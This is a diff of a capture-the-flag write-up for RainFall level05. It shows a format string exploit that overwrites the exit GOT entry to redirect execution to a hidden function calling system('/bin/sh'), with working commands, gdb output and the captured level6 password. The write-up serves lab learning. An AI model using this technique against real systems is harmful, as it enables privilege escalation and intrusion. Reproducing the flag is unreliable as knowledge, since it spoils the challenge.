@@ -1,14 +1,14 @@
 # level05
 
-Here we have still our user input in the first argument of printf, I do not see other thing.
-
-The program wait for an input, and print the result :
+The program wait for an input, and print the result:
 
 ```bash
-
+level5@RainFall:~$ ./level5 
+dsad
+dsad
 ```
 
-By looking at the assembly, we can see that the program call a function f, gets input from stdin with fgets and pass the result to printf.
+By looking at the code, we can see that the program call a function f, gets input from stdin with fgets and pass the result as only parameter printf.
 
 With "info functions", we can see that another function "o" is not called. It contains a call of system with "/bin/sh" as parameter :
 
@@ -24,12 +24,49 @@ Non-debugging symbols:
 ...
 ```
 
+With the "loop_address.py" script, we can found the Direct Access Parameter. We can also do it manually:
 
-We execute my "loop_address.py" script and I found my user input as write in the fourth Direct Access Parameter
+```bash
+level5@RainFall:~$ (python -c 'print "AAAA" + " %x" * 10') | ./level5
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
+```
 
-If we see the global offset table (global_offset_table.png), with "objdump -R level5" we can see the address to the exit fonction who is called at *n+61, we can overwrite this value to put the "o" function address to jump to the "o" function when the address of exit is call
+We can see that our DAP is at 4th position. We need now to override the function call after `printf`. For this, we get the address of `exit` by looking at the Global Offset Table:
 
-the "o" function address is "0x080484a4" it's 134513828 in base 10 we sub 4 for the 4 first byte of the destination address.
+```bash
+level5@RainFall:~$ objdump -R level5
 
-We can execute this cammand to have a shell with the level6 user right to get the flag:
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
+
+We can now override the value at 08049838 with a format string exploit. Our address to put is 0x080484a4. We substract 4 bytes, because we will print an address before:
+
+```bash
+(gdb) p/d 0x080484a4 - 4
+$1 = 134513824
+```
+
+We try to exploit:
+
+```bash
 (python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"';cat) | ./level5
+...
+              200
+whoami
+level6
+cd /home/user/level6
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
